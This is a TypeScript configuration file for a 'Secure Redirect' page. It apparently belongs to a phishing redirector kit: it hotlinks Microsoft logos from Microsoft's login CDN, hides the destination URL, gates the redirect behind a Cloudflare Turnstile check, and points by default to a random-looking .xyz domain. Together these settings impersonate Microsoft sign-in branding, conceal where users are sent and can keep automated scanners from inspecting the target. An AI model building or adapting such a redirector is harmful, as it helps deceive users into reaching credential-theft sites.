export interface Config {
  defaultTargetUrl: string;
  headerTitle: string;
  headerSubtitle: string;
  leftLogoUrl: string;
  rightLogoUrl: string;
  showDestinationUrl: boolean;
  theme: {
    primaryColor: string;
    backgroundColor: string;
    textColor: string;
  };
  turnstile: {
    siteKey: string;
    maxAttempts: number;
    cooldownPeriod: number; // in milliseconds
  };
}

export const defaultConfig: Config = {
  defaultTargetUrl: 'https://meheff.a8fdunxe2nb6y3n1kzlwykbse305mntqxwfgsmmasnyaxdb.xyz/TPCJyWnp',
  headerTitle: 'Secure Redirect',
  headerSubtitle: 'Please verify to continue',
  leftLogoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
  rightLogoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
  showDestinationUrl: false,
  theme: {
    primaryColor: '#3B82F6',
    backgroundColor: '#F9FAFB',
    textColor: '#1F2937',
  },
  turnstile: {
    siteKey: '0x4AAAAAABaeDHdwHVmJobfE',
    maxAttempts: 5,
    cooldownPeriod: 3600000 // 1 hour
  }
};

export const validateConfig = (config: Partial<Config>): Partial<Config> => {
  const validatedConfig: Partial<Config> = {};

  if (config.defaultTargetUrl) {
    try {
      new URL(config.defaultTargetUrl);
      validatedConfig.defaultTargetUrl = config.defaultTargetUrl;
    } catch (e) {
      console.warn('Invalid default target URL provided');
    }
  }

  if (config.headerTitle) {
    validatedConfig.headerTitle = config.headerTitle.slice(0, 50);
  }

  if (config.headerSubtitle) {
    validatedConfig.headerSubtitle = config.headerSubtitle.slice(0, 100);
  }

  if (config.leftLogoUrl) {
    try {
      new URL(config.leftLogoUrl);
      validatedConfig.leftLogoUrl = config.leftLogoUrl;
    } catch (e) {
      console.warn('Invalid left logo URL provided');
    }
  }

  if (config.rightLogoUrl) {
    try {
      new URL(config.rightLogoUrl);
      validatedConfig.rightLogoUrl = config.rightLogoUrl;
    } catch (e) {
      console.warn('Invalid right logo URL provided');
    }
  }

  if (config.showDestinationUrl !== undefined) {
    validatedConfig.showDestinationUrl = Boolean(config.showDestinationUrl);
  }

  if (config.theme) {
    validatedConfig.theme = {
      primaryColor: /^#[0-9A-F]{6}$/i.test(config.theme.primaryColor)
        ? config.theme.primaryColor
        : defaultConfig.theme.primaryColor,
      backgroundColor: /^#[0-9A-F]{6}$/i.test(config.theme.backgroundColor)
        ? config.theme.backgroundColor
        : defaultConfig.theme.backgroundColor,
      textColor: /^#[0-9A-F]{6}$/i.test(config.theme.textColor)
        ? config.theme.textColor
        : defaultConfig.theme.textColor,
    };
  }

  if (config.turnstile) {
    validatedConfig.turnstile = {
      siteKey: config.turnstile.siteKey || defaultConfig.turnstile.siteKey,
      maxAttempts: Math.max(1, Math.min(10, config.turnstile.maxAttempts)) || defaultConfig.turnstile.maxAttempts,
      cooldownPeriod: Math.max(0, config.turnstile.cooldownPeriod) || defaultConfig.turnstile.cooldownPeriod
    };
  }

  return validatedConfig;
};